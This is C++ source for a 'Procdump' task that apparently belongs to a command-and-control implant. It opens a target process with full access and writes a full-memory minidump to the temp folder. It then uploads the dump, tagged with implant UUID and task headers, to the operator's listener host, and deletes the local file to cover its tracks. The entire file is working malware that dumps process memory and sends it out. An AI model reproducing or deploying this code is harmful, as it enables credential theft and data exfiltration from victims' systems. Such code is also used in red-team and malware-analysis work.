#include "core/task.hpp"

namespace Task
{
    // There is no Native API to memory dump, so use WINAPIs for all process.
    std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
        // std::wstring wDumpFilePath = L"tmp.dmp";
        std::wstring wDumpFilePath = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\tmp.dmp";

        HANDLE hFile = CreateFile(
            wDumpFilePath.c_str(),
            GENERIC_ALL,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hFile == INVALID_HANDLE_VALUE)
        {
            return L"Error: Could not create a file to dump.";
        }

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);
        if (!hProcess)
        {
            CloseHandle(hFile);
            return L"Error: Could not open process.";
        }

        // Dump
        if (!MiniDumpWriteDump(
            hProcess,
            dwPid,
            hFile,
            MiniDumpWithFullMemory,
            NULL,
            NULL,
            NULL
        )) {
            CloseHandle(hFile);
            CloseHandle(hProcess);
            return L"Error: Failed to dump the process memory.";
        }

        CloseHandle(hFile);
        CloseHandle(hProcess);

        // Upload a dumped file.
        std::wstring wHeaders = L"";
        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
        wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
        wHeaders += L"X-FILE: procdump\r\n";

        if (!System::Http::FileUpload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathUpload,
            wHeaders.c_str(),
            wDumpFilePath
        )) {
            DeleteFile(wDumpFilePath.c_str());
            return L"Error: Could not upload the dump file.";
        }

        // Delete temp dump file
        DeleteFile(wDumpFilePath.c_str());

        return wDumpFilePath.c_str();
    }
}